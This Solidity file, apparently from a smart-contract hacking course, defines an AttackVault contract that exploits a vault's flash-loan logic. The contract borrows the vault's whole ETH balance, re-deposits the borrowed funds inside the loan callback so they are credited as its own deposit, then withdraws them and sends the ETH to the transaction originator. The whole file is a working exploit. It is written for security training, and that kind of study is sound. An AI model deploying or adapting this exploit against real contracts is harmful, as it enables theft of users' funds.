// SCH Course Copyright Policy (C): DO-NOT-SHARE-WITH-ANYONE
// https://smartcontractshacking.com/#copyright-policy
pragma solidity ^0.8.13;

import "@openzeppelin/contracts/utils/Address.sol";

interface IVault {
    function depositETH() external payable;
    function withdrawETH() external;
    function flashLoanETH(uint256 amount) external;
}

/**
 * @title AttackVault
 * @author JohnnyTime (https://smartcontractshacking.com)
 */
contract AttackVault {

    using Address for address payable;
    address private admin;
    IVault vault;
    
    constructor(address _vaultAddress) {
        vault = IVault(_vaultAddress);
        admin = msg.sender;
    }

    function attack() external {
        require(msg.sender == admin);
        vault.flashLoanETH(address(vault).balance);
        vault.withdrawETH();
    }

    function callBack() external payable {
        require(msg.sender == address(vault));
        require(tx.origin == admin);
        vault.depositETH{value: msg.value}();
    }

    receive() external payable {
        payable(tx.origin).sendValue(msg.value);
    }
}
